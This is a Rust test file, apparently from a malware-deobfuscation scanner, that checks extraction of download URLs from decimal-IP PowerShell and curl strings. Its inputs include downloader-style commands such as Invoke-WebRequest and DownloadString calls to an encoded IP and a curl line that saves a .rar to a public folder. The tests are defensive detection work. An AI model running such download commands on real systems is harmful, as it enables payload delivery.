        let mut env = Environment::new(&Config::default());
        scan_decimal_ip_urls(deob, &mut env);
        env.traits
            .iter()
            .filter_map(|t| match t {
                Trait::Download { src, .. } => Some(src.clone()),
                Trait::DownloadInDeobText { src, .. } => Some(src.clone()),
                _ => None,
            })
            .collect()
    }

    fn run_and_collect_traits(deob: &str) -> Vec<Trait> {
        let mut env = Environment::new(&Config::default());
        scan_decimal_ip_urls(deob, &mut env);
        env.traits
    }

    #[test]
    fn ps_invoke_webrequest_decimal_ip_decodes_to_dotted_quad() {
        // 1297338337 = 0x4D53CFE1 = 77.83.207.225
        let urls = run_and_collect_urls("Invoke-WebRequest 1297338337/x.jpg");
        assert_eq!(urls, vec!["http://77.83.207.225/x.jpg".to_string()]);
    }

    #[test]
    fn ps_invoke_webrequest_decimal_ip_emits_structured_download() {
        let traits = run_and_collect_traits("Invoke-WebRequest 1297338337/x.jpg");
        assert!(
            traits.iter().any(|t| matches!(t,
                Trait::Download { src, .. } if src == "http://77.83.207.225/x.jpg"
            )),
            "decimal-IP Invoke-WebRequest should emit Download: {:?}",
            traits
        );
        assert!(
            !traits.iter().any(|t| matches!(t,
                Trait::DownloadInDeobText { src, .. } if src == "http://77.83.207.225/x.jpg"
            )),
            "decimal-IP Invoke-WebRequest should not stay generic: {:?}",
            traits
        );
    }

    #[test]
    fn iwr_decimal_ip_without_path_still_emits() {
        let urls = run_and_collect_urls("iwr 16777216");
        assert_eq!(urls, vec!["http://1.0.0.0".to_string()]);
    }

    #[test]
    fn decimal_ip_with_invalid_high_octet_zero_is_skipped() {
        // 1234567 = 0x12d687, high byte = 0 → reject (not a valid IPv4 host)
        let urls = run_and_collect_urls("Invoke-WebRequest 1234567/p");
        assert!(urls.is_empty(), "got: {:?}", urls);
    }

    #[test]
    fn quoted_decimal_ip_form_is_recognized() {
        let urls = run_and_collect_urls(r#"DownloadString("1297338337/payload")"#);
        assert_eq!(urls, vec!["http://77.83.207.225/payload".to_string()]);
    }

    #[test]
    fn truncation_of_11plus_digit_runs_is_rejected() {
        // Regression: `\d{8,10}` greedily consumed the first 10 digits of
        // an 11-digit number, parsed as u32, emitted a fabricated IP URL.
        let urls = run_and_collect_urls(r#"Invoke-WebRequest 12345678901"#);
        assert!(
            urls.is_empty(),
            "11-digit run must not yield a phantom IOC; got: {:?}",
            urls
        );
    }

    #[test]
    fn prose_curl_in_comment_does_not_emit_phantom_ioc() {
        // Regression: `\bcurl\b` matched `curl` inside a prose comment,
        // captured the adjacent integer (timestamp/ID), and emitted a
        // fabricated Download trait. Verb anchor now requires command
        // position (line start or separator), not just word boundary.
        let urls = run_and_collect_urls("the analyst noted curl request id 1297338337-abcde");
        assert!(
            urls.is_empty(),
            "comment-prose mention must not emit IOC; got: {:?}",
            urls
        );
    }

    #[test]
    fn path_stops_at_semicolon_for_multi_statement_lines() {
        // Regression: path char class included `;` so the next PS statement
        // was swallowed into the URL.
        let urls = run_and_collect_urls("iwr 1297338337/x.jpg;Stop-Process");
        assert_eq!(urls, vec!["http://77.83.207.225/x.jpg".to_string()]);
    }

    #[test]
    fn line_start_invocation_still_extracts() {
        // Sanity: a normal command-line position match should still fire.
        let urls = run_and_collect_urls("Invoke-WebRequest 1297338337/x.jpg");
        assert_eq!(urls, vec!["http://77.83.207.225/x.jpg".to_string()]);
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
mod curl_redirect_parser_tests {
    use super::{normalize_curl_text, parse_curl_output_dst, split_words};

    #[test]
    fn echoed_full_path_curl_output_path_survives_normalization() {
        let raw = r#"curl.exe" https://fullpath-curl.example/z.rar -o c:\users\public\z.rar "#;
        let normalized = normalize_curl_text(raw);
        let tokens = split_words(&normalized);
        assert_eq!(tokens[0], "curl.exe");
        assert!(
            tokens.iter().any(|t| t == "-o"),
            "missing -o token: {:?}",
            tokens
        );
        assert!(
            tokens
                .iter()
                .any(|t| t.eq_ignore_ascii_case("c:\\users\\public\\z.rar")),
            "missing output token: {:?}",
            tokens
        );
        assert_eq!(
            parse_curl_output_dst(&normalized).as_deref(),
            Some(r#"c:\users\public\z.rar"#)
        );
    }
}
